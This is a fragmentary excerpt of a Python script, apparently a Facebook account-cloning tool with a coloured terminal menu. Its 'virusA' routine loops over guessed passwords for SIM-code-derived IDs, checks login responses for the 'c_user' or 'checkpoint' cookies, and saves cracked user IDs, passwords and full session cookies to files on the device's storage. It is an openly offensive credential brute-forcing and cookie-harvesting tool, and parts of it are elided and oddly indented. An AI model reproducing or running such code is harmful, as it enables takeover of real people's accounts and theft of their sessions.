...
def Main():
	os.system('clear')
	print(logo)
	print("\033[1;31m[\x1b[38;5;46m01\033[1;31m] \033[1;37m𝚁𝙰𝙽𝙳𝙾𝙼 𝙲𝙻𝙾𝙽𝙸𝙽𝙶")
	...
	if opt in ["A","1","01", "a"]:
		virusA()
	if opt in ["B","b","2","02"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100072extid=ZbWKwL');time.sleep(1)
	if opt in ["0","0"]:
		exit()
...
def virusA():
	...
	os.system('clear')
	print(logo)
	print("\033[1;31m[\x1b[38;5;46m=\033[1;31m] \033[1;37m𝙴𝚇𝙰𝙼𝙿𝙻𝙴 •𝙱𝙰𝙽• 𝚂𝙸𝙼 𝙲𝙾𝙳𝙴=\033[1;31m: \033[1;31m[\x1b[38;5;46m017<>018<>019<>016\033[1;31m]")
        ...
        for ps in pwx:
           ...
           'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[65:80]
                print('\033[38;5;46m[ᴷᵀᴹ-ᴼᴷ] ' +uid+'|'+ps+    '  \n\033[1;31m[\x1b[38;5;46mCOOKIE - 🍪\033[1;31m] \033[1;97m'+coki+ ' ')
      #          cek_apk(session,coki)                
                open('/sdcard/ᴷᵀᴹ-COOKIE.txt','a').write(uid+'|'+ps+ '|' +coki+'\n')
                open('/sdcard/ᴷᵀᴹ-OK.txt', 'a').write( uid+'|'+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
        #        print('\033[38;5;46m[ᴷᵀᴹ-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
                open('/sdcard/ᴷᵀᴹ-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
